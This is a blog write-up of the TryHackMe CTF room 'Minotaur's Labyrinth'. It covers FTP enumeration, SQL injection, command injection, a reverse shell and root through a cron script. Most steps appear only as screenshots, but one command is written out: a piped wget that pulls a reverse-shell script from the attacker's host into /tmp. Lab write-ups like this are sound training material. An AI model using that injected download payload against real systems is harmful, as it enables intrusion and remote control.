---
layout: single
classes: wide
title: "TryHackMe Minotaur's Labyrinth"
header:
  teaser: /assets/images/motoko.jpg
excerpt: "Minotaur's Labyrinth was a fun and medium level box that I found on tryhackme."
---

Minotaur's Labyrinth was a fun and medium level box that I found on tryhackme by [xenox](https://tryhackme.com/p/xenox) and [spayc](https://tryhackme.com/p/spayc).

 1. [NMAP(Port Scanning)](#nmap)
 2. [FTP](#ftp)
 3. [Enumeration web](#enumeration-web)
 4. [SQLi](#sqli)
 5. [Reverse shell](#reverse-shell)
 6. [root!](#root)
 
## NMAP
So first, nmap shows us 4 open ports on the machine :

![enter image description here](https://i.imgur.com/xwqYuyu.png)

## FTP
Let's enumerate the FTP :

![enter image description here](https://i.imgur.com/C3mct4Z.png)

So, anonymous login to FTP service is also possible. Let’s enumerate the FTP share.
Seems like there is a directory named pub, inside, we can see the first flag in a "secret" folder and the first flag in it.

![enter image description here](https://i.imgur.com/DumbZi2.png)

## Enumeration web
So now let's enumerate port 80

![enter image description here](https://i.imgur.com/jKNPiA2.png)

As we can see, there is a login page.
With dirbuster, (or any URL brute-forcer)
We can see that the js folder is readable and the login script too. 

![enter image description here](https://i.imgur.com/X5rYfGh.png)

Let's check 

![enter image description here](https://i.imgur.com/J6LICHN.png)

In the script comments, we can see the "pwdgen function". With a simple python script, we can now know the password of "Daedalus"

![enter image description here](https://i.imgur.com/kFKCbeQ.png)

Let's login on the page.

![enter image description here](https://i.imgur.com/k2fU7W3.png)

## SQLi

There is a page on which we can type a name or a creature and bring out its ID and password.
By exploring a bit, I discovered that there is a very simple sql injection (don't need sqlmap).

![enter image description here](https://i.imgur.com/EZVbYNY.png)

Now we can try to bruteforce the hash to know the password, we can do it easily with John, but with crackstation.com we can do it too.

![enter image description here](https://i.imgur.com/RNdUxFM.png)

Now let's login with Minotaur. (we know he's admin with the source code of the page)

![enter image description here](https://i.imgur.com/fErOu3s.png)

Nice! We have the second flag, and a new access. Let's check.
There is a page that does an "echo" command for anything you can put on it.

![enter image description here](https://i.imgur.com/ipJiCJg.png)

But, with some tests I could see that by using vertical bars we can do commands outside the echo

![enter image description here](https://i.imgur.com/XRkNl2k.png)

## Reverse shell

So this is simple, let's just upload a simple bash reverse shell.

![enter image description here](https://i.imgur.com/tTUWaDp.png)

With just `hi | wget {ip}/shell.sh -O /tmp/shell.sh` the machine can take our reverse shell.
Now we just have to execute it.

![enter image description here](https://i.imgur.com/hWRRG2Q.png)

In the /home folder, there is just 3 folders called "user" "minotaur" and "anonftp". In one of the three, there is the third flag.
## root!

Looking at all the files (or with scripts like linPEAS), we find a weird folder with a script that runs as root every minute. (cron)

![enter image description here](https://i.imgur.com/hq2FJML.png)

And.. The script is writable..
So just put another reverse shell on it and wait a few seconds.

![enter image description here](https://i.imgur.com/rZeJP16.png)

![enter image description here](https://i.imgur.com/zpgAixX.png)

And we have the last flag!
**rooted!**
